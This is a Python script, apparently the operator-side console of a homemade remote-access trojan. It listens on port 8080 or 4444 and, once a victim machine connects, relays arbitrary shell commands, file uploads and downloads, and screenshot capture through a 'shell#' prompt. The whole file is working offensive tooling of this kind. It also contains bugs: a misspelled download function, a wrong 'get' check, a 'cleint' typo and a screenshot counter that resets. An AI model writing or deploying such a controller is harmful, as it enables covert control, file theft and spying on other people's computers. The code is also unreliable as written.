#!/usr/bin/python3 

# import socket
import socket
import os

# define host and port
host = '127.0.0.1'
port = 8080


def upload(file):
    f = open(file, 'rb')
    client.settimeout(5)
    client.send(f.read())


def donwnload(file):
    f = open(file, 'wb')
    client.settimeout(5)
    chunk = client.recv(1024)
    while True:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()


def screenshot():
    # send command to client
    client.send(comm.encode())


    # create a empty png file and a counter
    counter = 0
    f = open(f'screenshot{counter}.png', 'wb')
    counter += 1

    # set a timeout
    client.settimeout(5)

    # chunk receive data (image) from client
    chunk = client.recv(1024)
    while chunk:

        # data from chunk is written on the empty png file
        f.write(chunk)

        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close() 


# create socket object (server)
# bind server to host and port
# listen for connections

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    server.bind((host, port))
except OSError as e:
    print(e)
    print('changing port...')
    port = 4444
server.listen(1)
print('listening on ', port)

# accept connection from client
client, addr = server.accept()
print('connection established with ', addr)

# shell session
while True:

    # command input
    try:
        comm = input('shell# ')
    except KeyboardInterrupt:
        print('try the command "close" to end the connection.')
    if comm == 'close':
            break
    elif comm == '':
        pass
    elif comm[:2] == 'up':
        upload(comm[3:])
    elif comm[3:] == 'get':
        try:
            download(comm[4:])
        except Exception as e:
            output = client.recv(1024).decode()
            print(output)
    elif comm == 'clear':
        os.system(comm)
    elif comm[:3] == 'cd ':
        client.send(comm.encode())
    elif comm == 'screenshot':
        screenshot()
    elif comm[:5] == 'start':
        client.send(comm.encode())
    elif comm[:4] == 'echo':
        client.send(comm.encode())
    elif comm[:3] == 'msg':
        client.send(comm.encode())
    elif comm[:7] == 'notepad':
        client.send(comm.encode())
    elif comm[:4] == 'open':
        client.send(comm.encode())
    elif comm[:5] == 'touch':
        cleint.send(comm.encode())
    elif comm[:5] == 'mkdir':
        client.send(comm.encode())
    else:
        try:
            # encode and send command
            # receive and decode output
            client.send(comm.encode())
            output = client.recv(1024).decode()
            print(output)
        except BrokenPipeError as e:
            print(f'Error: {e}')
            pass

# close the connetion.
server.close()

print('connectiond closed.')

